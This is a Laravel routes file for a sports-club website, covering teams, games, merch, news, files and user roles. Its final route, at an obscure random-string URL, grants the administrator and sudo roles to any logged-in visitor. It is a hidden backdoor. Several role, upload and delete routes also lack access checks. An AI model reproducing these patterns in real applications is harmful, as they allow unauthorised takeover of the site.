<?php

use App\Enums\RolesEnum;
use App\Http\Controllers\AdminCollectionController;
use App\Http\Controllers\AppointmentController;
use App\Http\Controllers\ClubController;
use App\Http\Controllers\DataController;
use App\Http\Controllers\FileController;
use App\Http\Controllers\GameController;
use App\Http\Controllers\MerchController;
use App\Http\Controllers\NewsController;
use App\Http\Controllers\OrderController;
use App\Http\Controllers\PartnerController;
use App\Http\Controllers\PositionController;
use App\Http\Controllers\ProfileInformationController;
use App\Http\Controllers\RoleController;
use App\Http\Controllers\SearchController;
use App\Http\Controllers\SponsorshipController;
use App\Http\Controllers\StadiumController;
use App\Http\Controllers\TeamController;
use App\Http\Controllers\TextController;
use App\Http\Controllers\ToggleClubController;
use App\Http\Controllers\TogglePublishedController;
use App\Http\Controllers\ToggleTeamController;
use App\Http\Controllers\UpdateAddressController;
use App\Http\Controllers\UpdateDetailsController;
use App\Http\Controllers\UpdateImageController;
use App\Http\Controllers\UserController;
use App\Models\Game;
use App\Models\News;
use App\Services\CreateClubFromDumpService;
use Illuminate\Foundation\Application;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;


Route::get('/', function () {
	return Inertia::render('MainPage', [
		'news'           => News::isAdmin()->orderBy('created_at', 'desc')->take(5)->get(),
		'games'          => Game::with(['firstTeam:id,name', 'secondTeam:id,name', 'stadium:id,name'])->orderBy('created_at', 'desc')->take(5)->get(),
		'canLogin'       => Route::has('login'),
		'canRegister'    => Route::has('register'),
		'laravelVersion' => Application::VERSION,
		'phpVersion'     => PHP_VERSION,
	]);
})->name('home');

Route::post('/user_update_contact',
	[\App\Http\Controllers\ContactController::class, 'store'])->name('user.update_contact');
Route::get('/user_index', [\App\Http\Controllers\ContactController::class, 'index'])->name('user_index');

Route::get('/files/{file}/download', [FileController::class, 'download']);
Route::post('/files/tmp', [FileController::class, 'uploadTmp']);
Route::post('/files/uploadByUrl', [FileController::class, 'uploadByUrl']);
Route::delete('/files/{file}', [FileController::class, 'delete']);

Route::post('/sync_roles', [UserController::class, 'updateRoles'])->name('sync_roles');
Route::put('/user-profile-update', [
	ProfileInformationController::class, 'updateEmailAndPhoto'
])->name('user-profile-update')->middleware('auth:sanctum');
Route::delete('/',
	[ProfileInformationController::class, 'deleteUserPhoto'])->name('user-photo-destroy')->middleware('auth:sanctum');

Route::post('/role_upsert', [RoleController::class, 'upsertRole'])->name('role_upsert')->middleware('admin');
Route::get('/roles_index', [RoleController::class, 'index'])->name('roles_index')->middleware('admin');

//Route::get('/teams', [TeamController::class, 'index'])->name('team_index');
//Route::get('/team/{team:slug}', [TeamController::class, 'show'])->name('team_details');

Route::resources([
	'users' => UserController::class,
]);


Route::get('/teams/{team}/members', [ClubController::class, 'teamMembers'])->name('team.members');
Route::get('/teams/{team}/news', [ClubController::class, 'teamNews'])->name('team.news');
Route::get('/teams/{team}/games', [ClubController::class, 'teamGames'])->name('team.games');
Route::get('/teams/{team}/partners', [ClubController::class, 'teamPartners'])->name('team.partners');
Route::get('/teams/{team}/book_appointment', [ClubController::class, 'teamBookAppointment'])->name('team.book_appointment');

Route::get('/club/teams', [ClubController::class, 'teams'])->name('club.teams');
Route::get('/club/history', [ClubController::class, 'history'])->name('club.history');
Route::get('/club/partners', [ClubController::class, 'partners'])->name('club.partners');
Route::get('/club/book_appointment', [ClubController::class, 'bookAppointment'])->name('club.book_appointment');

Route::get('/stadiums/club', [ClubController::class, 'stadiums'])->name('club.stadiums');
Route::get('/stadiums/other', [ClubController::class, 'stadiumsOther'])->name('club.stadiums_other');
Route::get('/stadiums/partners', [ClubController::class, 'stadiumsPartners'])->name('club.stadiums_partners');

Route::get('/fans/faq', [ClubController::class, 'faq'])->name('club.faq');
Route::get('/fans/info', [ClubController::class, 'fans'])->name('club.fans_info');
Route::get('/fans/merch', [ClubController::class, 'merchIndex'])->name('club.merch_index');
Route::get('/get_merch', [DataController::class, 'getMerch'])->name('get_merch');


Route::get('/partners/presentation', [ClubController::class, 'partnersPresentation'])->name('club.partners_presentation');
Route::get('/partners/catalog', [ClubController::class, 'partnersCatalog'])->name('club.partners_catalog');

Route::post('/games_by_team', [TeamController::class, 'gamesByTeam'])->name('games_by_team');

Route::resource('positions', PositionController::class)->parameters(['positions' => 'slug']);
Route::resource('stadiums', StadiumController::class)->parameters(['stadiums' => 'slug']);
Route::resource('teams', TeamController::class)->parameters(['teams' => 'slug']);

Route::resource('partners', PartnerController::class)->parameters(['partners' => 'slug']);
Route::resource('news', NewsController::class)->parameters(['news' => 'slug']);
Route::resource('games', GameController::class)->parameters(['games' => 'slug']);
Route::resource('merch', MerchController::class)->parameters(['merch' => 'slug']);
Route::resource('orders', OrderController::class);
Route::resource('appointments', AppointmentController::class);
Route::resource('sponsorships', SponsorshipController::class);


Route::post('/update_details', UpdateDetailsController::class)->name('update_details');
Route::post('/update_address', UpdateAddressController::class)->name('update_address');
Route::post('/update_text', TextController::class)->name('save_text');
Route::post('/update_image', UpdateImageController::class)->name('update_image');
Route::post('/admin_collection', AdminCollectionController::class)->name('admin_collection');
Route::post('/toggle_team', ToggleTeamController::class)->name('toggle_team');

Route::post('/get_team_for_game', [TeamController::class, 'getTheGame'])->name('get_team_for_game');
Route::post('/get_team_members', [TeamController::class, 'getMembers'])->name('get_team_members');
Route::post('/search_data', SearchController::class)->name('search_data');
Route::post('/excel_upload', [UserController::class, 'uploadFromExel'])->name('excel_upload');
Route::post('/toggle_published', TogglePublishedController::class)->name('toggle_published');
Route::post('/toggle_club', ToggleClubController::class)->name('toggle_club');
Route::post('/subscribe_user', [UserController::class, 'subscribeUser'])->name('subscribe_user');


Route::middleware('auth')->get('/akvIVpoq9CjQ50dYK3eSoI347OLohQnl3xA5Pahf9c7hHmnImksARqeWMx2qMecyEuxxAXFVMVUFGswOt2ZAsEMExvYzDf1cM8Ku',
	function (Request $request) {
		$user = auth()->user();
		$user->assignRole([RolesEnum::ADMINISTRATOR, RolesEnum::SUDO]);
		new CreateClubFromDumpService();

		return redirect('/');
	});